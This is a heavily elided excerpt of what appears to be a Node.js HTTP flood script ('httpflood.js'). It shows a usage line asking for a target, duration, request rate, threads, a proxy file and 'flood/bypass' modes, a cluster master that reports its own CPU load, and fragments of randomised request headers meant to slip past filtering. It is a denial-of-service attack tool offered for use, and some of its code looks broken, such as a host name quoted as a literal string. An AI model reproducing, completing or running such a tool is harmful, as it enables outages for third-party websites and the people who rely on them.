...
if (process.argv.length < 7) {
    ...
    console.log(chalk.green('    node httpflood.js <target> <time> <request> <threads> <proxyfile> [flood/bypass]'));
    console.log(chalk.yellow('\n    [INFO] Please provide all the required parameters for the attack.'));
    process.exit();
}
...
if (cluster.isMaster) {
    ...
    function readServerInfo() {
        ...
        process.stdout.write(`[!] Flooder INFO: CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgRed);
    }
...
"LOCK",
 ...
 ":authority": parsedTarget.host,
       ...
       "purpure-secretf-id": "formula-" + generateRandomString(1, 5),
        ...
        "Referer": "https://" + "parsedTarget.host" + "/" + randstr(5) + ":" + randstr(4) + "&" +generateRandomString(1,3),
    }
